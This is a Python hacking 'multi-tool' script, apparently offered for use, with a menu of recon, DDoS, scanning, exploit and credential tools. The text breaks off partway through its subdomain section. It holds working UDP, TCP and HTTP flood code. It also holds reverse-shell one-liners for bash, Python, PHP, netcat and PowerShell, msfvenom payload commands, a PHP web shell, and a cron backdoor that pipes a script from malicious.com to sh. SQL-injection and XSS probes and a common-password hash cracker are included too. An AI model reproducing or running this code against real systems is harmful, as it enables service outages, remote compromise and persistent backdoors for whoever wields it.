#!/usr/bin/env python3
# H737 Multi-Tool
# Created by DanzSec17
# Contact: danzsec17@gmail.com / 085189976548

import os
import sys
import subprocess
import socket
import requests
import json
import threading
import time
import random
import hashlib
import base64
import urllib.parse
import struct
import select
import itertools
import string
from concurrent.futures import ThreadPoolExecutor
import dns.resolver
import ssl
import urllib3
from fake_useragent import UserAgent

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Color codes
class Colors:
    RED = '\033[1;31m'
    GREEN = '\033[1;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[1;34m'
    CYAN = '\033[1;36m'
    WHITE = '\033[1;37m'
    RESET = '\033[0m'

def banner():
    os.system('clear')
    print(f"""{Colors.RED}
 ██╗  ██╗██████╗ ██████╗ ██████╗ 
 ██║  ██║╚════██╗╚════██╗╚════██╗
 ███████║ █████╔╝ █████╔╝ █████╔╝
 ╚════██║██╔═══╝ ██╔═══╝ ██╔═══╝ 
      ██║███████╗███████╗███████╗
      ╚═╝╚══════╝╚══════╝╚══════╝
{Colors.WHITE}
╔════════════════════════════════════════╗
║           Created by: DanzSec17        ║
║     Contact: danzsec17@gmail.com    ║
║         Donasi: 085189976548          ║
╚════════════════════════════════════════╝
{Colors.RESET}""")

def print_menu():
    print(f"""{Colors.GREEN}
╔════════════════════════════════════════╗
║              MAIN MENU                 ║
╠════════════════════════════════════════╣
║  1.  RECON TOOLS                       ║
║  2.  DDOS TOOLS (BRUTAL)               ║
║  3.  VULNERABILITY SCAN                ║
║  4.  EXPLOIT TOOLS                     ║
║  5.  CREDENTIALS TOOLS                 ║
║  6.  SUBDOMAIN TO IP                   ║
║  7.  DISCOVERY DOMAIN ENGINE           ║
║  8.  GEO IP LOCKING                    ║
║  9.  REMOVE DUPLICATE LIST             ║
║  10. SUBDOMAIN SCAN                    ║
║  11. WORDPRESS SCAN                    ║
║  12. SQL INJECTION SCAN                ║
║  13. PORT SCANNER                      ║
║  14. NETWORK SNIFFER                   ║
║  15. WEB CRAWLER                       ║
║  16. HASH CRACKER                      ║
║  17. ENCRYPTION TOOLS                  ║
║  18. SOCIAL ENGINEERING                ║
║  19. ANDROID HACKING                   ║
║  20. WIFI ATTACK                       ║
║  21. DONASI ADMIN                      ║
║  0.  EXIT                              ║
╚════════════════════════════════════════╝{Colors.RESET}""")

# ================================
# 1. RECON TOOLS - SUPER LENGKAP
# ================================

def recon_tools():
    banner()
    print(f"""{Colors.RED}
██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗
██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║
██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║
██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║
██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║
╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝
{Colors.WHITE}           TOOLS RECONNAISSANCE{Colors.RESET}
""")
    
    print(f"{Colors.GREEN}[+] Advanced Reconnaissance Tools:{Colors.RESET}")
    print("1. Nmap Advanced Scan")
    print("2. Whois Deep Lookup")
    print("3. DNS Bruteforce")
    print("4. Port Scanner (Multi-thread)")
    print("5. Network Scanner")
    print("6. OS Fingerprinting")
    print("7. Back to Main Menu")
    
    choice = input(f"\n{Colors.YELLOW}[?] Select option [1-7]: {Colors.RESET}")
    
    if choice == "1":
        target = input(f"{Colors.YELLOW}[?] Enter target IP/Domain: {Colors.RESET}")
        print(f"{Colors.YELLOW}[+] Running Advanced Nmap scan...{Colors.RESET}")
        try:
            subprocess.run(['nmap', '-sS', '-sV', '-sC', '-A', '-O', target])
        except FileNotFoundError:
            print(f"{Colors.RED}[!] Nmap not found. Install with: pkg install nmap{Colors.RESET}")
    
    elif choice == "2":
        domain = input(f"{Colors.YELLOW}[?] Enter domain: {Colors.RESET}")
        print(f"{Colors.YELLOW}[+] Performing Deep Whois lookup...{Colors.RESET}")
        try:
            subprocess.run(['whois', domain])
        except FileNotFoundError:
            print(f"{Colors.RED}[!] Whois not installed. Install with: pkg install whois{Colors.RESET}")
    
    elif choice == "3":
        domain = input(f"{Colors.YELLOW}[?] Enter domain: {Colors.RESET}")
        print(f"{Colors.YELLOW}[+] Bruteforcing DNS records...{Colors.RESET}")
        
        subdomains = ['www', 'mail', 'ftp', 'localhost', 'webmail', 'admin', 'blog', 'shop', 
                     'api', 'test', 'dev', 'staging', 'portal', 'cpanel', 'whm', 'webdisk']
        
        found_count = 0
        for sub in subdomains:
            full_domain = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(full_domain)
                print(f"{Colors.GREEN}[+] Found: {full_domain} -> {ip}{Colors.RESET}")
                found_count += 1
            except socket.gaierror:
                print(f"{Colors.RED}[-] Not found: {full_domain}{Colors.RESET}")
        
        print(f"{Colors.CYAN}[+] Found {found_count} subdomains{Colors.RESET}")
    
    elif choice == "4":
        target = input(f"{Colors.YELLOW}[?] Enter target IP: {Colors.RESET}")
        print(f"{Colors.YELLOW}[+] Multi-threaded Port Scanning...{Colors.RESET}")
        
        def scan_port(port):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            sock.close()
            return port, result == 0
        
        open_ports = []
        with ThreadPoolExecutor(max_workers=100) as executor:
            results = executor.map(scan_port, range(1, 1001))
            
            for port, is_open in results:
                if is_open:
                    open_ports.append(port)
                    print(f"{Colors.GREEN}[+] Port {port}: OPEN{Colors.RESET}")
        
        print(f"{Colors.CYAN}[+] Scan completed. Found {len(open_ports)} open ports{Colors.RESET}")
    
    elif choice == "5":
        network = input(f"{Colors.YELLOW}[?] Enter network (e.g., 192.168.1.0/24): {Colors.RESET}")
        print(f"{Colors.YELLOW}[+] Scanning network...{Colors.RESET}")
        
        try:
            base_ip = network.rsplit('.', 1)[0]
            active_hosts = []
            for i in range(1, 255):
                ip = f"{base_ip}.{i}"
                try:
                    socket.setdefaulttimeout(0.5)
                    hostname = socket.gethostbyaddr(ip)
                    active_hosts.append(ip)
                    print(f"{Colors.GREEN}[+] Active host: {ip} ({hostname[0]}){Colors.RESET}")
                except:
                    pass
            print(f"{Colors.CYAN}[+] Found {len(active_hosts)} active hosts{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[!] Network scan failed: {e}{Colors.RESET}")
    
    elif choice == "6":
        target = input(f"{Colors.YELLOW}[?] Enter target IP: {Colors.RESET}")
        print(f"{Colors.YELLOW}[+] OS Fingerprinting...{Colors.RESET}")
        
        try:
            response = subprocess.run(['ping', '-c', '1', target], capture_output=True, text=True)
            if 'ttl=' in response.stdout:
                ttl = int(response.stdout.split('ttl=')[1].split(' ')[0])
                if ttl <= 64:
                    os_type = "Linux/Unix"
                elif ttl <= 128:
                    os_type = "Windows"
                else:
                    os_type = "Other"
                print(f"{Colors.GREEN}[+] Detected OS: {os_type} (TTL: {ttl}){Colors.RESET}")
            else:
                print(f"{Colors.RED}[!] Could not determine TTL{Colors.RESET}")
        except:
            print(f"{Colors.RED}[!] OS detection failed{Colors.RESET}")
    
    elif choice == "7":
        return
    
    input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")

# ================================
# 2. DDOS TOOLS - SUPER BRUTAL & WORKING
# ================================

class BrutalDDoS:
    def __init__(self):
        self.attack_running = False
        self.packets_sent = 0
        self.requests_sent = 0
        
    def udp_flood(self, target_ip, target_port, duration, threads):
        """UDP Flood yang benar-benar work"""
        self.attack_running = True
        self.packets_sent = 0
        
        def flood():
            while self.attack_running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    data = random._urandom(1024)
                    sock.sendto(data, (target_ip, target_port))
                    sock.close()
                    self.packets_sent += 1
                except:
                    pass
        
        print(f"{Colors.RED}[🚀] Starting UDP FLOOD Attack...{Colors.RESET}")
        print(f"{Colors.YELLOW}[🎯] Target: {target_ip}:{target_port}{Colors.RESET}")
        print(f"{Colors.YELLOW}[⚡] Threads: {threads}{Colors.RESET}")
        print(f"{Colors.YELLOW}[⏱️] Duration: {duration} seconds{Colors.RESET}")
        print(f"{Colors.RED}[💀] ATTACKING TARGET...{Colors.RESET}")
        
        # Start attack threads
        thread_list = []
        for _ in range(threads):
            thread = threading.Thread(target=flood)
            thread.daemon = True
            thread.start()
            thread_list.append(thread)
        
        # Monitor attack
        start_time = time.time()
        while time.time() - start_time < duration and self.attack_running:
            elapsed = time.time() - start_time
            print(f"{Colors.CYAN}[💥] Attacking... {elapsed:.1f}s | Packets: {self.packets_sent}{Colors.RESET}", end='\r')
            time.sleep(0.1)
        
        self.attack_running = False
        time.sleep(2)
        print(f"\n{Colors.GREEN}[✅] Attack finished! Total packets sent: {self.packets_sent}{Colors.RESET}")
    
    def tcp_flood(self, target_ip, target_port, duration, threads):
        """TCP Flood Attack"""
        self.attack_running = True
        self.packets_sent = 0
        
        def flood():
            while self.attack_running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((target_ip, target_port))
                    sock.send(random._urandom(1024))
                    sock.close()
                    self.packets_sent += 1
                except:
                    self.packets_sent += 1
        
        print(f"{Colors.RED}[🚀] Starting TCP FLOOD Attack...{Colors.RESET}")
        print(f"{Colors.YELLOW}[🎯] Target: {target_ip}:{target_port}{Colors.RESET}")
        print(f"{Colors.RED}[💀] ATTACKING TARGET...{Colors.RESET}")
        
        thread_list = []
        for _ in range(threads):
            thread = threading.Thread(target=flood)
            thread.daemon = True
            thread.start()
            thread_list.append(thread)
        
        start_time = time.time()
        while time.time() - start_time < duration and self.attack_running:
            elapsed = time.time() - start_time
            print(f"{Colors.CYAN}[💥] TCP Flooding... {elapsed:.1f}s | Connections: {self.packets_sent}{Colors.RESET}", end='\r')
            time.sleep(0.1)
        
        self.attack_running = False
        time.sleep(2)
        print(f"\n{Colors.GREEN}[✅] TCP Flood finished! Total connections: {self.packets_sent}{Colors.RESET}")
    
    def http_flood(self, target_url, duration, threads):
        """HTTP Flood Attack"""
        self.attack_running = True
        self.requests_sent = 0
        
        def flood():
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive'
            }
            
            while self.attack_running:
                try:
                    response = requests.get(target_url, headers=headers, timeout=5, verify=False)
                    self.requests_sent += 1
                except requests.exceptions.RequestException:
                    self.requests_sent += 1
        
        print(f"{Colors.RED}[🚀] Starting HTTP FLOOD Attack...{Colors.RESET}")
        print(f"{Colors.YELLOW}[🎯] Target: {target_url}{Colors.RESET}")
        print(f"{Colors.RED}[💀] ATTACKING TARGET...{Colors.RESET}")
        
        thread_list = []
        for _ in range(threads):
            thread = threading.Thread(target=flood)
            thread.daemon = True
            thread.start()
            thread_list.append(thread)
        
        start_time = time.time()
        while time.time() - start_time < duration and self.attack_running:
            elapsed = time.time() - start_time
            print(f"{Colors.CYAN}[💥] HTTP Flooding... {elapsed:.1f}s | Requests: {self.requests_sent}{Colors.RESET}", end='\r')
            time.sleep(0.1)
        
        self.attack_running = False
        time.sleep(2)
        print(f"\n{Colors.GREEN}[✅] HTTP Flood finished! Total requests: {self.requests_sent}{Colors.RESET}")
    
    def mixed_attack(self, target_ip, target_port, duration):
        """Mixed Attack - All methods combined"""
        print(f"{Colors.RED}[💀] STARTING MIXED BRUTAL ATTACK!{Colors.RESET}")
        print(f"{Colors.YELLOW}[🎯] Target: {target_ip}:{target_port}{Colors.RESET}")
        print(f"{Colors.RED}[⚠️] WARNING: This will consume significant resources!{Colors.RESET}")
        
        # Start all attacks
        threads = []
        
        # UDP Flood
        udp_thread = threading.Thread(target=self.udp_flood, args=(target_ip, target_port, duration, 30))
        udp_thread.daemon = True
        udp_thread.start()
        threads.append(udp_thread)
        
        # TCP Flood
        tcp_thread = threading.Thread(target=self.tcp_flood, args=(target_ip, target_port, duration, 30))
        tcp_thread.daemon = True
        tcp_thread.start()
        threads.append(tcp_thread)
        
        # If it's a web server, add HTTP flood
        if target_port in [80, 443, 8080, 8443]:
            url = f"http://{target_ip}" if target_port != 443 else f"https://{target_ip}"
            http_thread = threading.Thread(target=self.http_flood, args=(url, duration, 20))
            http_thread.daemon = True
            http_thread.start()
            threads.append(http_thread)
        
        print(f"{Colors.RED}[💣] ALL ATTACKS LAUNCHED! TARGET WILL BE DESTROYED!{Colors.RESET}")
        
        start_time = time.time()
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            print(f"{Colors.RED}[🔥] MIXED ATTACK IN PROGRESS... {elapsed:.1f}s{Colors.RESET}", end='\r')
            time.sleep(1)
        
        self.attack_running = False
        time.sleep(3)
        print(f"\n{Colors.GREEN}[✅] Mixed attack completed! Target should be down!{Colors.RESET}")

def ddos_tools():
    banner()
    print(f"""{Colors.RED}
██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║  ██║██║  ██║██║   ██║███████╗
██║  ██║██║  ██║██║   ██║╚════██║
██████╔╝██████╔╝╚██████╔╝███████║
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
{Colors.WHITE}         BRUTAL DDOS TOOLS{Colors.RESET}
""")
    
    print(f"{Colors.RED}[⚡] WARNING: FOR EDUCATIONAL PURPOSES ONLY!{Colors.RESET}")
    print(f"{Colors.RED}[⚡] USE ONLY ON SYSTEMS YOU OWN!{Colors.RESET}")
    
    ddos = BrutalDDoS()
    
    while True:
        print(f"\n{Colors.GREEN}[+] Available DDOS Attacks:{Colors.RESET}")
        print("1. UDP FLOOD Attack (Most Effective)")
        print("2. TCP FLOOD Attack")
        print("3. HTTP FLOOD Attack (Websites)")
        print("4. MIXED ATTACK (All Methods - BRUTAL)")
        print("5. Stop Current Attack")
        print("6. Back to Main Menu")
        
        choice = input(f"\n{Colors.YELLOW}[?] Select attack type [1-6]: {Colors.RESET}")
        
        if choice == "1":
            target_ip = input(f"{Colors.YELLOW}[?] Target IP: {Colors.RESET}")
            target_port = int(input(f"{Colors.YELLOW}[?] Target Port: {Colors.RESET}"))
            duration = int(input(f"{Colors.YELLOW}[?] Duration (seconds): {Colors.RESET}"))
            threads = int(input(f"{Colors.YELLOW}[?] Number of threads (1-500): {Colors.RESET}"))
            
            attack_thread = threading.Thread(target=ddos.udp_flood, args=(target_ip, target_port, duration, threads))
            attack_thread.daemon = True
            attack_thread.start()
            
        elif choice == "2":
            target_ip = input(f"{Colors.YELLOW}[?] Target IP: {Colors.RESET}")
            target_port = int(input(f"{Colors.YELLOW}[?] Target Port: {Colors.RESET}"))
            duration = int(input(f"{Colors.YELLOW}[?] Duration (seconds): {Colors.RESET}"))
            threads = int(input(f"{Colors.YELLOW}[?] Number of threads (1-500): {Colors.RESET}"))
            
            attack_thread = threading.Thread(target=ddos.tcp_flood, args=(target_ip, target_port, duration, threads))
            attack_thread.daemon = True
            attack_thread.start()
            
        elif choice == "3":
            target_url = input(f"{Colors.YELLOW}[?] Target URL (with http/https): {Colors.RESET}")
            duration = int(input(f"{Colors.YELLOW}[?] Duration (seconds): {Colors.RESET}"))
            threads = int(input(f"{Colors.YELLOW}[?] Number of threads (1-200): {Colors.RESET}"))
            
            attack_thread = threading.Thread(target=ddos.http_flood, args=(target_url, duration, threads))
            attack_thread.daemon = True
            attack_thread.start()
            
        elif choice == "4":
            target_ip = input(f"{Colors.YELLOW}[?] Target IP: {Colors.RESET}")
            target_port = int(input(f"{Colors.YELLOW}[?] Target Port: {Colors.RESET}"))
            duration = int(input(f"{Colors.YELLOW}[?] Duration (seconds): {Colors.RESET}"))
            
            attack_thread = threading.Thread(target=ddos.mixed_attack, args=(target_ip, target_port, duration))
            attack_thread.daemon = True
            attack_thread.start()
            
        elif choice == "5":
            ddos.attack_running = False
            print(f"{Colors.GREEN}[✅] Attack stop signal sent!{Colors.RESET}")
            time.sleep(2)
            
        elif choice == "6":
            ddos.attack_running = False
            return
        
        print(f"{Colors.YELLOW}[!] Attack started in background...{Colors.RESET}")
        time.sleep(2)

# ================================
# 3. VULNERABILITY SCAN - WORKING
# ================================

def vulnerability_scan():
    banner()
    print(f"""{Colors.RED}
██╗   ██╗██╗   ██╗██╗     ██████╗ ███████╗
██║   ██║██║   ██║██║     ██╔══██╗██╔════╝
██║   ██║██║   ██║██║     ██║  ██║█████╗  
██║   ██║██║   ██║██║     ██║  ██║██╔══╝  
╚██████╔╝╚██████╔╝███████╗██████╔╝███████╗
 ╚═════╝  ╚═════╝ ╚══════╝╚═════╝ ╚══════╝
{Colors.WHITE}          VULNERABILITY SCANNER{Colors.RESET}
""")
    
    target = input(f"{Colors.YELLOW}[?] Enter target URL/IP: {Colors.RESET}")
    if not target.startswith('http'):
        target = 'http://' + target
    
    print(f"{Colors.YELLOW}[+] Scanning for vulnerabilities...{Colors.RESET}")
    
    vulnerabilities_found = []
    
    # Check SQL Injection
    print(f"{Colors.CYAN}[*] Checking SQL Injection...{Colors.RESET}")
    if check_sql_injection(target):
        vulnerabilities_found.append("SQL Injection")
        print(f"{Colors.RED}[!] SQL Injection: VULNERABLE{Colors.RESET}")
    else:
        print(f"{Colors.GREEN}[-] SQL Injection: Secure{Colors.RESET}")
    
    time.sleep(1)
    
    # Check XSS
    print(f"{Colors.CYAN}[*] Checking XSS Vulnerability...{Colors.RESET}")
    if check_xss(target):
        vulnerabilities_found.append("SQL Injection")
        print(f"{Colors.RED}[!] SQL Injection: VULNERABLE{Colors.RESET}")
    else:
        print(f"{Colors.GREEN}[-] SQL Injection: Secure{Colors.RESET}")
    
    time.sleep(1)
    
    # Check XSS
    print(f"{Colors.CYAN}[*] Checking XSS Vulnerability...{Colors.RESET}")
    if check_xss(target):
        vulnerabilities_found.append("XSS")
        print(f"{Colors.RED}[!] XSS: VULNERABLE{Colors.RESET}")
    else:
        print(f"{Colors.GREEN}[-] XSS: Secure{Colors.RESET}")
    
    time.sleep(1)
    
    # Check sensitive files
    print(f"{Colors.CYAN}[*] Checking sensitive files...{Colors.RESET}")
    sensitive_files = check_sensitive_files(target)
    if sensitive_files:
        vulnerabilities_found.append("Sensitive Files Exposure")
        for file in sensitive_files:
            print(f"{Colors.RED}[!] Sensitive file exposed: {file}{Colors.RESET}")
    else:
        print(f"{Colors.GREEN}[-] Sensitive files: Secure{Colors.RESET}")
    
    time.sleep(1)
    
    # Check server info
    print(f"{Colors.CYAN}[*] Checking server information...{Colors.RESET}")
    server_info = check_server_info(target)
    if server_info:
        vulnerabilities_found.append("Information Disclosure")
        for info in server_info:
            print(f"{Colors.RED}[!] Information disclosed: {info}{Colors.RESET}")
    else:
        print(f"{Colors.GREEN}[-] Server information: Secure{Colors.RESET}")
    
    # Summary
    print(f"\n{Colors.CYAN}[+] SCAN SUMMARY:{Colors.RESET}")
    if vulnerabilities_found:
        print(f"{Colors.RED}[!] Found {len(vulnerabilities_found)} vulnerabilities:{Colors.RESET}")
        for vuln in vulnerabilities_found:
            print(f"{Colors.RED}    - {vuln}{Colors.RESET}")
    else:
        print(f"{Colors.GREEN}[+] No vulnerabilities found!{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")

def check_sql_injection(target):
    """Check for SQL Injection vulnerabilities"""
    payloads = ["'", "1' OR '1'='1", "' OR 1=1--"]
    for payload in payloads:
        try:
            test_url = f"{target}?id={payload}"
            response = requests.get(test_url, timeout=5, verify=False)
            if any(error in response.text.lower() for error in ['sql', 'mysql', 'database', 'syntax', 'error']):
                return True
        except:
            pass
    return False

def check_xss(target):
    """Check for XSS vulnerabilities"""
    payload = "<script>alert('XSS')</script>"
    try:
        test_url = f"{target}?q={payload}"
        response = requests.get(test_url, timeout=5, verify=False)
        if payload in response.text:
            return True
    except:
        pass
    return False

def check_sensitive_files(target):
    """Check for exposed sensitive files"""
    sensitive_paths = [
        "/.env", "/config.php", "/.git/config", "/backup.zip",
        "/admin.php", "/phpinfo.php", "/.htaccess", "/web.config"
    ]
    exposed_files = []
    for path in sensitive_paths:
        try:
            response = requests.get(target + path, timeout=3, verify=False)
            if response.status_code == 200:
                exposed_files.append(path)
        except:
            pass
    return exposed_files

def check_server_info(target):
    """Check for server information disclosure"""
    info_disclosed = []
    try:
        response = requests.get(target, timeout=5, verify=False)
        headers = response.headers
        
        if 'server' in headers:
            info_disclosed.append(f"Server: {headers['server']}")
        if 'x-powered-by' in headers:
            info_disclosed.append(f"Powered by: {headers['x-powered-by']}")
        if 'x-aspnet-version' in headers:
            info_disclosed.append(f"ASP.NET: {headers['x-aspnet-version']}")
            
    except:
        pass
    return info_disclosed

# ================================
# 4. EXPLOIT TOOLS - WORKING
# ================================

def exploit_tools():
    banner()
    print(f"""{Colors.RED}
     
  ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   █
██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   
███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
{Colors.WHITE}             EXPLOITATION TOOLS{Colors.RESET}
""")
    
    print(f"{Colors.GREEN}[+] Exploit Tools:{Colors.RESET}")
    print("1. Search Exploits")
    print("2. Generate Payload")
    print("3. Reverse Shell Generator")
    print("4. Backdoor Creator")
    print("5. Back to Main Menu")
    
    choice = input(f"\n{Colors.YELLOW}[?] Select option: {Colors.RESET}")
    
    if choice == "1":
        search_term = input(f"{Colors.YELLOW}[?] Search for exploit: {Colors.RESET}")
        print(f"{Colors.YELLOW}[+] Searching exploits for: {search_term}{Colors.RESET}")
        
        # Simulate exploit database search
        exploits = [
            f"exploit/windows/http/{search_term}_rce",
            f"exploit/linux/ssh/{search_term}_auth_bypass", 
            f"exploit/multi/http/{search_term}_file_upload",
            f"exploit/unix/webapp/{search_term}_sql_injection",
            f"exploit/android/local/{search_term}_privilege_escalation"
        ]
        
        for exp in exploits:
            print(f"{Colors.GREEN}[+] {exp}{Colors.RESET}")
            time.sleep(0.3)
            
    elif choice == "2":
        lhost = input(f"{Colors.YELLOW}[?] LHOST: {Colors.RESET}")
        lport = input(f"{Colors.YELLOW}[?] LPORT: {Colors.RESET}")
        
        print(f"\n{Colors.GREEN}[+] Payloads generated:{Colors.RESET}")
        payloads = {
            "Windows": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o payload.exe",
            "Linux": f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o payload.elf", 
            "Android": f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f apk -o payload.apk",
            "PHP": f"msfvenom -p php/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o payload.php",
            "Python": f"msfvenom -p python/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o payload.py"
        }
        
        for os_type, payload in payloads.items():
            print(f"{Colors.CYAN}[{os_type}] {payload}{Colors.RESET}")
            
    elif choice == "3":
        lhost = input(f"{Colors.YELLOW}[?] LHOST: {Colors.RESET}")
        lport = input(f"{Colors.YELLOW}[?] LPORT: {Colors.RESET}")
        
        print(f"\n{Colors.GREEN}[+] Reverse Shell Commands:{Colors.RESET}")
        shells = {
            "Bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "Python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "PHP": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "Netcat": f"nc -e /bin/sh {lhost} {lport}",
            "PowerShell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        }
        
        for lang, shell in shells.items():
            print(f"{Colors.CYAN}[{lang}]{Colors.RESET}")
            print(f"{Colors.WHITE}{shell}{Colors.RESET}\n")
            
    elif choice == "4":
        print(f"\n{Colors.GREEN}[+] Backdoor Creation Tools:{Colors.RESET}")
        print(f"{Colors.CYAN}[1] Web Shell (PHP){Colors.RESET}")
        print(f"<?php system($_GET['cmd']); ?>")
        print(f"\n{Colors.CYAN}[2] Persistent Backdoor{Colors.RESET}")
        print(f"echo '*/1 * * * * curl http://malicious.com/shell.sh | sh' | crontab -")
        print(f"\n{Colors.CYAN}[3] SSH Backdoor{Colors.RESET}")
        print(f"echo 'ssh-rsa AAAAB3Nza...' >> ~/.ssh/authorized_keys")
        
    elif choice == "5":
        return
    
    input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")

# ================================
# 5. CREDENTIALS TOOLS - WORKING
# ================================

def credentials_tools():
    banner()
    print(f"""{Colors.RED}
 ██████╗██████╗ ███████╗██████╗ ███████╗
██╔════╝██╔══██╗██╔════╝██╔══██╗██╔════╝
██║     ██████╔╝█████╗  ██║  ██║███████╗
██║     ██╔══██╗██╔══╝  ██║  ██║╚════██║
╚██████╗██║  ██║███████╗██████╔╝███████║
 ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚══════╝
{Colors.WHITE}           CREDENTIALS MANAGER{Colors.RESET}
""")
    
    print(f"{Colors.GREEN}[+] Credential Tools:{Colors.RESET}")
    print("1. Password Generator")
    print("2. Hash Cracker")
    print("3. Wordlist Generator")
    print("4. Password Strength Checker")
    print("5. Back to Main Menu")
    
    choice = input(f"\n{Colors.YELLOW}[?] Select tool: {Colors.RESET}")
    
    if choice == "1":
        length = int(input(f"{Colors.YELLOW}[?] Password length: {Colors.RESET}"))
        count = int(input(f"{Colors.YELLOW}[?] Number of passwords: {Colors.RESET}"))
        
        print(f"\n{Colors.GREEN}[+] Generated passwords:{Colors.RESET}")
        for i in range(count):
            chars = string.ascii_letters + string.digits + "!@#$%^&*"
            password = ''.join(random.choices(chars, k=length))
            print(f"{Colors.CYAN}[{i+1}] {password}{Colors.RESET}")
            
    elif choice == "2":
        hash_value = input(f"{Colors.YELLOW}[?] Enter hash: {Colors.RESET}")
        hash_type = input(f"{Colors.YELLOW}[?] Hash type (md5/sha1/sha256): {Colors.RESET}")
        
        print(f"{Colors.YELLOW}[+] Cracking hash...{Colors.RESET}")
        
        common_passwords = ["password", "123456", "admin", "letmein", "qwerty", "password123", "12345678", "123456789", "1234", "12345"]
        
        found = False
        for pwd in common_passwords:
            if hash_type == "md5":
                test_hash = hashlib.md5(pwd.encode()).hexdigest()
            elif hash_type == "sha1":
                test_hash = hashlib.sha1(pwd.encode()).hexdigest()
            elif hash_type == "sha256":
                test_hash = hashlib.sha256(pwd.encode()).hexdigest()
            else:
                print(f"{Colors.RED}[!] Unsupported hash type{Colors.RESET}")
                break
            
            print(f"{Colors.CYAN}[*] Trying: {pwd}{Colors.RESET}")
            if test_hash == hash_value:
                print(f"{Colors.GREEN}[+] Password found: {pwd}{Colors.RESET}")
                found = True
                break
            time.sleep(0.1)
        
        if not found:
            print(f"{Colors.RED}[-] Password not found in common list{Colors.RESET}")
            
    elif choice == "3":
        base_word = input(f"{Colors.YELLOW}[?] Base word: {Colors.RESET}")
        output_file = input(f"{Colors.YELLOW}[?] Output filename: {Colors.RESET}")
        
        print(f"{Colors.YELLOW}[+] Generating wordlist...{Colors.RESET}")
        
        mutations = [
            base_word,
            base_word + "123",
            base_word + "!",
            base_word + "2024",
            base_word + "1",
            base_word.upper(),
            base_word.capitalize(),
            "123" + base_word,
            base_word + "1234",
            base_word + "!"
        ]
        
        with open(output_file, 'w') as f:
            for word in mutations:
                f.write(word + '\n')
        
        print(f"{Colors.GREEN}[+] Wordlist created: {output_file} ({len(mutations)} words){Colors.RESET}")
        
    elif choice == "4":
        password = input(f"{Colors.YELLOW}[?] Enter password to check: {Colors.RESET}")
        
        score = 0
        if len(password) >= 8: score += 1
        if any(c.islower() for c in password): score += 1
        if any(c.isupper() for c in password): score += 1
        if any(c.isdigit() for c in password): score += 1
        if any(c in "!@#$%^&*" for c in password): score += 1
        
        strength = ["Very Weak", "Weak", "Fair", "Good", "Strong", "Very Strong"][score]
        color = [Colors.RED, Colors.RED, Colors.YELLOW, Colors.GREEN, Colors.GREEN, Colors.CYAN][score]
        
        print(f"{color}[+] Password Strength: {strength} ({score}/5){Colors.RESET}")
        
    elif choice == "5":
        return
    
    input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")

# ================================
# 6. SUBDOMAIN TO IP - WORKING
# ================================

def subdomain_to_ip():
    banner()
    print(f"""{Colors.RED}
███████╗██╗   ██╗██████╗ ██████╗  ██████╗ ███╗   ███╗ █████╗ ██╗███╗   ██╗
